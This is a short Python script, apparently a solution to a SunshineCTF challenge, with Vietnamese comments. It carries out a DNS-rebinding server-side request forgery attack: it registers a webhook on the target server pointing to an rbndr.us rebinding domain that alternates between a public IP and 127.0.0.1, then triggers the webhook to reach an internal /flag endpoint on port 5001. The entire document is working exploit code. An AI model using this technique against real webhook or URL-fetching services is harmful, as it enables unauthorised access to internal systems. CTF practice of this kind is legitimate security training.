import requests
import time
import socket

# Target server
TARGET_URL = "https://supernova.sunshinectf.games"

# Rebinding webhook URL (thêm /flag và port 5001)
REBIND_URL = "http://08080808.7f000001.rbndr.us:5001/flag"


print("Đang register webhook...")
register_data = {"url": REBIND_URL}
response = requests.post(f"{TARGET_URL}/register", data=register_data)

if response.status_code != 200:
    print(f"Lỗi register: {response.text}")
    exit(1)

try:
    result = response.json()
    webhook_id = result["id"]
    print(f"Webhook registered! ID: {webhook_id}")
except:
    print(f"Lỗi parse JSON: {response.text}")
    exit(1)


time.sleep(5)


try:
    ip = socket.gethostbyname("08080808.7f000001.rbndr.us")
    print(f"DNS resolve hiện tại: {ip} ")
except:
    print("Không resolve được domain")


print("Đang trigger webhook...")
trigger_data = {"id": webhook_id}
response = requests.post(f"{TARGET_URL}/trigger", data=trigger_data)

if response.status_code == 200:
    try:
        result = response.json()
        print(f"Thành công! Status: {result.get('status', 'N/A')}")
        print(f"Response: {result.get('response', 'No response')}")

    except:
        print(f"Response JSON lỗi: {response.text}")
else:
    print(f"Lỗi trigger: {response.status_code} - {response.text}")